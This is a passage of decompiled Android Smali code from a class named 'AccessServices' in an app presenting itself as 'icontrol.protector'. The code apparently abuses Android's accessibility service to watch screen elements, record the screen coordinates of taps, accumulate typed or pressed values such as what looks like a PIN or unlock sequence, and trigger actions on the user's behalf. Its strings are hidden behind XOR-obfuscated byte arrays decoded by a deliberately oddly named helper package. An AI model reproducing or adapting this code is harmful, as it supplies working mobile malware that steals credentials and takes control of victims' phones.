    sub-int/2addr v3, v8

    invoke-virtual {v0, v7, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_5

    :cond_e
    :goto_4
    :try_start_2
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v3

    const/16 v5, 0x80

    if-ne v3, v5, :cond_f

    invoke-static/range {p0 .. p0}, Lcom/icontrol/protector/n;->O(Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_f

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return-void

    :cond_f
    if-eqz v9, :cond_15

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_15

    sget v3, Lcom/icontrol/protector/AccessServices;->T:I

    if-eqz v3, :cond_10

    sub-int/2addr v3, v8

    sput v3, Lcom/icontrol/protector/AccessServices;->T:I

    return-void

    :cond_10
    sput v8, Lcom/icontrol/protector/AccessServices;->T:I

    new-array v3, v12, [B

    fill-array-data v3, :array_33

    new-array v5, v4, [B

    fill-array-data v5, :array_34

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_11

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v5, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v5, v11, [B

    fill-array-data v5, :array_35

    new-array v6, v4, [B

    fill-array-data v6, :array_36

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;

    new-instance v3, Landroid/graphics/Rect;

    invoke-direct {v3}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    new-instance v0, Landroid/graphics/Point;

    invoke-virtual {v3}, Landroid/graphics/Rect;->centerX()I

    move-result v5

    invoke-virtual {v3}, Landroid/graphics/Rect;->centerY()I

    move-result v3

    invoke-direct {v0, v5, v3}, Landroid/graphics/Point;-><init>(II)V

    sget-object v3, Lcom/icontrol/protector/AccessServices;->Q:Ljava/util/Map;

    invoke-static {v13}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-interface {v3, v5, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    return-void

    :cond_11
    sget-object v0, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;

    new-array v3, v11, [B

    fill-array-data v3, :array_37

    new-array v5, v4, [B

    fill-array-data v5, :array_38

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_12

    sput-object v6, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;

    return-void

    :cond_12
    sget-object v0, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-nez v0, :cond_13

    invoke-virtual {v9}, Ljava/lang/String;->length()I

    move-result v0

    if-le v0, v8, :cond_13

    return-void

    :cond_13
    new-array v0, v11, [B

    fill-array-data v0, :array_39

    new-array v3, v4, [B

    fill-array-data v3, :array_3a

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/AccessServices;->S:Ljava/lang/String;

    invoke-static {v9}, Lcom/icontrol/protector/AccessServices;->p(Ljava/lang/String;)Ljava/lang/String;

    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_3b

    new-array v3, v4, [B

    fill-array-data v3, :array_3c

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_5

    :cond_14
    :try_start_3
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v3

    if-eqz v3, :cond_15

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/icontrol/protector/AccessServices;->n(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    if-eqz v3, :cond_15

    new-array v5, v11, [B

    fill-array-data v5, :array_3d

    new-array v6, v4, [B

    fill-array-data v6, :array_3e

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    sput-object v5, Lcom/icontrol/protector/AccessServices;->S:Ljava/lang/String;

    sget-object v5, Lcom/icontrol/protector/AccessServices;->P:Ljava/lang/String;

    invoke-virtual {v3}, Ljava/lang/Integer;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-nez v5, :cond_15

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v6, Lcom/icontrol/protector/AccessServices;->P:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/Integer;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    sput-object v5, Lcom/icontrol/protector/AccessServices;->P:Ljava/lang/String;

    const/4 v5, 0x7

    new-array v5, v5, [B

    fill-array-data v5, :array_3f

    new-array v6, v4, [B

    fill-array-data v6, :array_40

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-instance v5, Landroid/graphics/Rect;

    invoke-direct {v5}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v0, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    new-instance v0, Landroid/graphics/Point;

    invoke-virtual {v5}, Landroid/graphics/Rect;->centerX()I

    move-result v6

    invoke-virtual {v5}, Landroid/graphics/Rect;->centerY()I

    move-result v5

    invoke-direct {v0, v6, v5}, Landroid/graphics/Point;-><init>(II)V

    sget-object v5, Lcom/icontrol/protector/AccessServices;->Q:Ljava/util/Map;

    goto/16 :goto_2

    :catch_1
    :cond_15
    :goto_5
    const/16 v0, 0xd

    new-array v3, v0, [B

    fill-array-data v3, :array_41

    new-array v5, v4, [B

    fill-array-data v5, :array_42

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    new-array v0, v0, [B

    fill-array-data v0, :array_43

    new-array v4, v4, [B

    fill-array-data v4, :array_44

    invoke-static {v0, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_7

    :goto_6
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_7
    return-void

    :array_0
    .array-data 1
        -0x62t
        -0x7at
        -0x66t
        -0x73t
        0x31t
        0x4et
        0x30t
        0x22t
        -0x6et
        -0x80t
        -0x6dt
        -0x73t
        0x23t
        0x59t
        0x27t
        0x24t
        -0x68t
        -0x7ct
        -0x7et
        -0x36t
        0x6at
        0x49t
        0x30t
        0x7ft
        -0x6ft
        -0x7at
        -0x6ct
        -0x38t
        0x0t
        0x41t
        0x20t
        0x24t
        -0x68t
        -0x65t
        -0x67t
        -0xbt
        0x39t
        0x45t
        0x23t
    .end array-data

    :array_1
    .array-data 1
        -0x3t
        -0x17t
        -0x9t
        -0x5dt
        0x50t
        0x20t
        0x54t
        0x50t
    .end array-data

    :array_2
    .array-data 1
        0xet
        0x2ct
        -0x8t
        -0x56t
        -0x7at
        -0x1bt
        0x38t
        -0x5ft
        0x2t
        0x2at
        -0xft
        -0x56t
        -0x6ct
        -0xet
        0x2ft
        -0x59t
        0x8t
        0x2et
        -0x20t
        -0x13t
        -0x23t
        -0x1et
        0x38t
        -0x4t
        0x1bt
        0x2at
        -0x1dt
        -0x15t
        -0x48t
        -0x19t
        0x33t
        -0x50t
        0x6t
        0x1ct
        -0x1bt
        -0x1bt
        -0x6dt
        -0x1t
        0x39t
        -0x5ft
        0x3t
        0x1ct
        -0x1dt
        -0x13t
        -0x7et
        -0x4t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x6dt
        0x43t
        -0x6bt
        -0x7ct
        -0x19t
        -0x75t
        0x5ct
        -0x2dt
    .end array-data

    :array_4
    .array-data 1
        0x3ft
        0xbt
        0x4dt
        0x66t
        -0x16t
        0x5at
        0x59t
        -0x70t
        0x8t
        0x35t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x7ct
        0x6et
        0x21t
        0xat
        -0x36t
        0x2et
        0x3ct
        -0x18t
    .end array-data

    :array_6
    .array-data 1
        0x58t
        0x72t
        0x3bt
        0x47t
        0x73t
        -0x3bt
        -0x5at
        0x65t
    .end array-data

    :array_7
    .array-data 1
        0x56t
        -0x79t
        0x21t
        0x5t
        -0x28t
        -0x44t
        -0x77t
        0x79t
        0x4et
    .end array-data

    nop

    :array_8
    .array-data 1
        0x15t
        -0x1et
        0x4dt
        0x69t
        -0x8t
        -0x8t
        -0x34t
        0x2at
    .end array-data

    :array_9
    .array-data 1
        -0x5dt
        -0x51t
        -0x3ft
        0x3ft
        0x3bt
        0x52t
        0x29t
        -0x24t
    .end array-data

    :array_a
    .array-data 1
        -0xct
        0x68t
        -0x61t
        -0x44t
        -0x53t
        -0x6t
        0x1ct
        -0x6dt
    .end array-data

    :array_b
    .array-data 1
        -0x49t
        0xdt
        -0xdt
        -0x30t
        -0x73t
        -0x4dt
        0x58t
        -0x38t
    .end array-data

    :array_c
    .array-data 1
        -0x1dt
        -0x73t
        -0x54t
        0x29t
        -0x4ft
        -0x1t
        -0x56t
        -0x79t
    .end array-data

    :array_d
    .array-data 1
        0x2ft
        0x49t
        0x19t
        0x1dt
        -0x7bt
        0x0t
        0x21t
        -0x20t
        0x23t
        0x4ft
        0x10t
        0x1dt
        -0x69t
        0x17t
        0x36t
        -0x1at
        0x29t
        0x4bt
        0x1t
        0x5at
        -0x22t
        0x7t
        0x21t
        -0x43t
        0x3ct
        0x47t
        0x7t
        0x40t
        -0x6dt
        0x1t
        0x37t
        -0xat
        0x9t
        0x48t
        0x0t
        0x41t
        -0x63t
    .end array-data

    nop

    :array_e
    .array-data 1
        0x4ct
        0x26t
        0x74t
        0x33t
        -0x1ct
        0x6et
        0x45t
        -0x6et
    .end array-data

    :array_f
    .array-data 1
        0x6ct
        0x3t
        0x68t
        0xat
        -0x7dt
        -0x4ft
        -0x36t
        0x48t
        0x60t
        0x5t
        0x61t
        0xat
        -0x77t
        -0x46t
        -0x29t
        0x5dt
        0x7at
        0xdt
        0x77t
        0x40t
        -0x28t
        -0x4at
        -0x36t
        0x15t
        0x62t
        0x5t
        0x70t
        0x4dt
        -0x43t
        -0x4et
        -0x39t
        0x42t
        0x6at
        0x8t
        0x5at
        0x54t
        -0x7dt
        -0x54t
        -0x23t
        0x4dt
        0x60t
        0x1et
        0x61t
        0x7bt
        -0x75t
        -0x4ft
        -0x22t
        0x4ft
        0x7bt
        0x33t
        0x63t
        0x4dt
        -0x79t
        -0x4dt
        -0x36t
    .end array-data

    :array_10
    .array-data 1
        0xft
        0x6ct
        0x5t
        0x24t
        -0x1et
        -0x21t
        -0x52t
        0x3at
    .end array-data

    :array_11
    .array-data 1
        0x68t
        0xct
        0x5t
        0x16t
        0x53t
        0x6at
        -0x80t
        -0x7t
        0x64t
        0xat
        0xct
        0x16t
        0x41t
        0x7dt
        -0x69t
        -0x1t
        0x6et
        0xet
        0x1dt
        0x51t
        0x8t
        0x6dt
        -0x80t
        -0x5ct
        0x69t
        0x17t
        0x6t
        0x67t
        0x5et
        0x61t
        -0x70t
        -0x1t
        0x6et
        0x11t
        0x37t
        0x57t
        0x59t
    .end array-data

    nop

    :array_12
    .array-data 1
        0xbt
        0x63t
        0x68t
        0x38t
        0x32t
        0x4t
        -0x1ct
        -0x75t
    .end array-data

    :array_13
    .array-data 1
        0x53t
        -0x46t
        -0x76t
        0x59t
        -0x51t
        0x49t
        0x51t
        -0x79t
        0x5ft
        -0x44t
        -0x7dt
        0x59t
        -0x43t
        0x5et
        0x46t
        -0x7ft
        0x55t
        -0x48t
        -0x6et
        0x1et
        -0xct
        0x4et
        0x51t
        -0x26t
        0x43t
        -0x50t
        -0x7ct
        0x2t
        -0x44t
        0x4et
        0x41t
        -0x74t
        0x75t
        -0x4ft
        -0x72t
        0x3t
        -0x66t
        0x42t
        0x4dt
        -0x7ft
    .end array-data

    :array_14
    .array-data 1
        0x30t
        -0x2bt
        -0x19t
        0x77t
        -0x32t
        0x27t
        0x35t
        -0xbt
    .end array-data

    :array_15
    .array-data 1
        -0x3ct
        0x16t
        0xdt
        -0x48t
        -0x1ct
        -0x2et
        0x52t
        -0x12t
        -0x2bt
        0x16t
        0x9t
        -0x80t
        -0x6at
        -0x63t
        0x4ft
        -0xdt
        -0x2ct
        0xdt
        0x5t
        -0x77t
        -0x41t
        -0x26t
        0x6t
        -0x1dt
        -0x3dt
        0x56t
        0xbt
        -0x7ft
        -0x4dt
        -0x18t
        0xct
        -0x59t
        -0x62t
        0x24t
    .end array-data

    nop

    :array_16
    .array-data 1
        -0x59t
        0x79t
        0x60t
        -0x1ct
        -0x36t
        -0x4dt
        0x3ct
        -0x76t
    .end array-data

    :array_17
    .array-data 1
        -0x7dt
        0x75t
        0x9t
        0x24t
        0x31t
        0x23t
        0x6dt
        0x69t
        -0x6et
        0x75t
        0xdt
        0x1ct
        0x43t
        0x6ct
        0x70t
        0x74t
        -0x6dt
        0x6et
        0x1t
        0x15t
        0x6at
        0x2bt
        0x39t
        0x64t
        -0x7ct
        0x35t
        0x32t
        0x11t
        0x69t
        0x2dt
        0x53t
        0x64t
        -0x72t
        0x71t
        0x1t
        0x1t
        0x44t
        0x72t
        0x2et
        0x34t
        -0x43t
    .end array-data

    nop

    :array_18
    .array-data 1
        -0x20t
        0x1at
        0x64t
        0x78t
        0x1ft
        0x42t
        0x3t
        0xdt
    .end array-data

    :array_19
    .array-data 1
        -0x65t
        0x27t
        0xat
        -0x40t
        -0x61t
        -0x9t
        -0x1at
        -0x6ct
        -0x76t
        0x27t
        0xet
        -0x8t
        -0x13t
        -0x48t
        -0x5t
        -0x77t
        -0x75t
        0x3ct
        0x2t
        -0xft
        -0x3ct
        -0x1t
        -0x4et
        -0x67t
        -0x64t
        0x67t
        0xct
        -0x7t
        -0x38t
        -0x33t
        -0x48t
        -0x23t
        -0x3ft
        0x15t
    .end array-data

    nop

    :array_1a
    .array-data 1
        -0x8t
        0x48t
        0x67t
        -0x64t
        -0x4ft
        -0x6at
        -0x78t
        -0x10t
    .end array-data

    :array_1b
    .array-data 1
        0x3at
        0x28t
        0x67t
        0x1et
        -0x44t
        0x4t
        -0x43t
        -0x79t
        0x36t
        0x2et
        0x6et
        0x1et
        -0x52t
        0x13t
        -0x56t
        -0x7ft
        0x3ct
        0x2at
        0x7ft
        0x59t
        -0x19t
        0x3t
        -0x43t
        -0x26t
        0x32t
        0x22t
        0x73t
        0x6ft
        -0x48t
        0x4t
        -0x53t
        -0x70t
        0x2bt
    .end array-data

    nop

    :array_1c
    .array-data 1
        0x59t
        0x47t
        0xat
        0x30t
        -0x23t
        0x6at
        -0x27t
        -0xbt
    .end array-data

    :array_1d
    .array-data 1
        0x0t
        -0x32t
        -0x6bt
        -0x10t
        -0x77t
        -0xdt
        0x9t
        -0x73t
        0xct
        -0x38t
        -0x64t
        -0x10t
        -0x7dt
        -0x8t
        0x14t
        -0x68t
        0x16t
        -0x40t
        -0x76t
        -0x46t
        -0x2et
        -0xct
        0x9t
        -0x30t
        0x8t
        -0x3ct
        -0x7ft
        -0x7ft
        -0x73t
        -0xdt
        0x19t
        -0x66t
        0x11t
    .end array-data

    nop

    :array_1e
    .array-data 1
        0x63t
        -0x5ft
        -0x8t
        -0x22t
        -0x18t
        -0x63t
        0x6dt
        -0x1t
    .end array-data

    :array_1f
    .array-data 1
        0x59t
        -0x3et
        0x41t
        -0x2bt
        0x7bt
        0x29t
        -0x67t
        -0x16t
        0x48t
        -0x3et
        0x45t
        -0x13t
        0x9t
        0x66t
        -0x64t
        -0x15t
        0x43t
        -0x36t
        0x59t
        -0x18t
        0x27t
        0x2ct
        -0x33t
        -0x19t
        0x5et
        -0x7et
        0x47t
        -0x14t
        0x2ct
        0x13t
        -0x39t
        -0x5dt
        0x3t
        -0x10t
    .end array-data

    nop

    :array_20
    .array-data 1
        0x3at
        -0x53t
        0x2ct
        -0x77t
        0x55t
        0x48t
        -0x9t
        -0x72t
    .end array-data

    :array_21
    .array-data 1
        -0x45t
        -0x1bt
    .end array-data

    nop

    :array_22
    .array-data 1
        -0x35t
        -0x74t
        -0x4at
        -0x58t
        0x58t
        0x5dt
        -0x79t
        0x20t
    .end array-data

    :array_23
    .array-data 1
        -0x10t
        0x41t
        0x74t
        0x1dt
        0x36t
        0x1et
        0x69t
        -0x27t
        -0x15t
        0x4dt
        0x7et
    .end array-data

    :array_24
    .array-data 1
        -0x60t
        0x8t
        0x3at
        0x3dt
        0x75t
        0x52t
        0x20t
        -0x66t
    .end array-data

    :array_25
    .array-data 1
        -0x6at
        0x4t
        0x1bt
        0x69t
        0x51t
        -0x73t
        -0x9t
        0x44t
        -0x66t
        0x2t
        0x12t
        0x69t
        0x43t
        -0x66t
        -0x20t
        0x42t
        -0x70t
        0x6t
        0x3t
        0x2et
        0xat
        -0x76t
        -0x9t
        0x19t
        -0x62t
        0xet
        0xft
        0x18t
        0x55t
        -0x73t
        -0x19t
        0x53t
        -0x79t
    .end array-data

    nop

    :array_26
    .array-data 1
        -0xbt
        0x6bt
        0x76t
        0x47t
        0x30t
        -0x1dt
        -0x6dt
        0x36t
    .end array-data

    :array_27
    .array-data 1
        -0x1ct
        -0x12t
        -0x38t
        0x1dt
        0x79t
        0x42t
        -0x62t
        -0x72t
        -0x18t
        -0x18t
        -0x3ft
        0x1dt
        0x73t
        0x49t
        -0x7dt
        -0x65t
        -0xet
        -0x20t
        -0x29t
        0x57t
        0x22t
        0x45t
        -0x62t
        -0x2dt
        -0x14t
        -0x1ct
        -0x24t
        0x6ct
        0x7dt
        0x42t
        -0x72t
        -0x67t
        -0xbt
    .end array-data

    nop

    :array_28
    .array-data 1
        -0x79t
        -0x7ft
        -0x5bt
        0x33t
        0x18t
        0x2ct
        -0x6t
        -0x4t
    .end array-data

    :array_29
    .array-data 1
        -0x3t
        -0x3dt
        0x3et
    .end array-data

    :array_2a
    .array-data 1
        -0x53t
        -0x76t
        0x70t
        -0x7dt
        -0x11t
        0x1et
        0xft
        -0x33t
    .end array-data

    :array_2b
    .array-data 1
        -0x2t
        -0x17t
        0x4ft
        -0x3dt
        0x5at
        -0x64t
        -0x36t
        0x3ft
        -0xct
        -0x1at
    .end array-data

    nop

    :array_2c
    .array-data 1
        -0x6ft
        -0x7et
        0x6ft
        -0x60t
        0x36t
        -0xbt
        -0x57t
        0x54t
    .end array-data

    :array_2d
    .array-data 1
        -0x27t
        -0x64t
    .end array-data

    nop

    :array_2e
    .array-data 1
        -0x1dt
        -0x27t
        0xet
        -0x57t
        0x62t
        0x4at
        -0x11t
        0x49t
    .end array-data

    :array_2f
    .array-data 1
        0x0t
        -0x34t
        -0x12t
        0x30t
        -0x52t
        -0x69t
        0x6bt
        -0xet
        0xct
        -0x36t
        -0x19t
        0x30t
        -0x44t
        -0x80t
        0x7ct
        -0xct
        0x6t
        -0x32t
        -0xat
        0x77t
        -0xbt
        -0x70t
        0x6bt
        -0x51t
        0x7t
        -0x3at
        -0x11t
        0x7bt
        -0x45t
        -0x64t
        0x50t
        -0x1et
        0x16t
        -0x29t
        -0x9t
        0x71t
        -0x5ft
    .end array-data

    nop

    :array_30
    .array-data 1
        0x63t
        -0x5dt
        -0x7dt
        0x1et
        -0x31t
        -0x7t
        0xft
        -0x80t
    .end array-data

    :array_31
    .array-data 1
        0x44t
        0x52t
        0xft
        0x38t
        0x40t
        -0x13t
        -0x2dt
        -0x6ct
        0x48t
        0x54t
        0x6t
        0x38t
        0x4at
        -0x1at
        -0x32t
        -0x7ft
        0x52t
        0x5ct
        0x10t
        0x72t
        0x1bt
        -0x16t
        -0x2dt
        -0x37t
        0x43t
        0x58t
        0xet
        0x73t
        0x55t
        -0x1at
        -0x18t
        -0x7ct
        0x52t
        0x49t
        0x16t
        0x79t
        0x4ft
    .end array-data

    nop

    :array_32
    .array-data 1
        0x27t
        0x3dt
        0x62t
        0x16t
        0x21t
        -0x7dt
        -0x49t
        -0x1at
    .end array-data

    :array_33
    .array-data 1
        0x51t
        0x4at
        0x2bt
        0x7dt
        -0x78t
        0x58t
        0x17t
        0x21t
        0x5dt
        0x4ct
        0x22t
        0x7dt
        -0x66t
        0x4ft
        0x0t
        0x27t
        0x57t
        0x48t
        0x33t
        0x3at
        -0x2dt
        0x5ft
        0x17t
        0x7ct
        0x50t
        0x51t
        0x28t
        0xct
        -0x7bt
        0x53t
        0x7t
        0x27t
        0x57t
        0x57t
        0x19t
        0x3ct
        -0x7et
    .end array-data

    nop

    :array_34
    .array-data 1
        0x32t
        0x25t
        0x46t
        0x53t
        -0x17t
        0x36t
        0x73t
        0x53t
    .end array-data

    :array_35
    .array-data 1
        0x2dt
        0x6ct
    .end array-data

    nop

    :array_36
    .array-data 1
        0x17t
        0x29t
        0x3bt
        -0x41t
        0x50t
        -0x22t
        0x6t
        -0x62t
    .end array-data

    :array_37
    .array-data 1
        0x59t
        0x1t
    .end array-data

    nop

    :array_38
    .array-data 1
        0x63t
        0x44t
        0x32t
        -0x7et
        0x34t
        0x20t
        0x2ft
        -0x28t
    .end array-data

    :array_39
    .array-data 1
        -0x20t
        -0x39t
    .end array-data

    nop

    :array_3a
    .array-data 1
        -0x70t
        -0x5at
        0x55t
        -0x4dt
        -0x1t
        0x2ct
        -0x2t
        -0x74t
    .end array-data

    :array_3b
    .array-data 1
        0x1dt
        -0x7et
        -0x2ft
        0x40t
        -0x25t
    .end array-data

    nop

    :array_3c
    .array-data 1
        0x4dt
        -0x3dt
        -0x7et
        0x13t
        -0x1ft
        0x7t
        -0x73t
        -0x72t
    .end array-data

    :array_3d
    .array-data 1
        -0x3dt
        0x75t
    .end array-data

    nop

    :array_3e
    .array-data 1
        -0x4dt
        0x1t
        0x68t
        0x31t
        0xdt
        -0x31t
        -0x1ct
        0x55t
    .end array-data

    :array_3f
    .array-data 1
        0x66t
        0xbt
        -0x70t
        0x5t
        0x66t
        0x75t
        0x5ft
    .end array-data

    :array_40
    .array-data 1
        0x36t
        0x6at
        -0x1ct
        0x71t
        0x3t
        0x7t
        0x31t
        0x54t
    .end array-data

    :array_41
    .array-data 1
        -0x43t
        0x5at
        0x13t
        -0x66t
        -0x55t
        -0x29t
        -0x66t
        -0x1bt
        -0x45t
        0x5ct
        0xbt
        -0x6dt
        -0x11t
    .end array-data

    nop

    :array_42
    .array-data 1
        -0x22t
        0x3ft
        0x7ft
        -0xat
        -0x75t
        -0x4dt
        -0x1t
        -0x6ft
    .end array-data

    :array_43
    .array-data 1
        -0x12t
        -0x70t
        0x20t
        0x44t
        0x53t
        0x32t
        0xft
        0x5bt
        -0x1dt
        -0x66t
        0x3dt
        0x1dt
        0x1t
    .end array-data

    nop

    :array_44
    .array-data 1
        -0x76t
        -0xbt
        0x53t
        0x27t
        0x21t
        0x5bt
        0x7ft
        0x2ft
    .end array-data
.end method

.method public static n(Ljava/lang/String;)Ljava/lang/Integer;
    .locals 2

    .line 1
    const/4 v0, 0x3

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v0

    invoke-virtual {v0, p0}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object p0

    invoke-virtual {p0}, Ljava/util/regex/Matcher;->find()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object p0

    invoke-static {p0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p0

    invoke-static {p0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p0

    return-object p0

    :cond_0
    const/4 p0, 0x0

    return-object p0

    :array_0
    .array-data 1
        -0x66t
        -0x2bt
        -0x4at
    .end array-data

    :array_1
    .array-data 1
        -0x3at
        -0x4ft
        -0x63t
        -0x53t
        -0x6at
        -0x22t
        -0x7ft
        -0x13t
    .end array-data
.end method

.method private o(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    .locals 4

    .line 1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    return v1

    :cond_0
    const/4 v0, 0x0

    move v2, v0

    :goto_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    if-ge v2, v3, :cond_2

    invoke-virtual {p1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-eqz v3, :cond_1

    invoke-direct {p0, v3, p2}, Lcom/icontrol/protector/AccessServices;->o(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_1

    return v1

    :cond_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_2
    return v0
.end method

.method public static p(Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    .line 1
    const/4 v0, 0x3

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {p0, v0, v1}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object p0, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;

    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result p0

    if-nez p0, :cond_1

    sget-object p0, Lcom/icontrol/protector/AccessServices;->U:Ljava/lang/String;

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v0

    add-int/lit8 v0, v0, -0x1

    const/4 v1, 0x0

    invoke-virtual {p0, v1, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object p0

    :goto_0
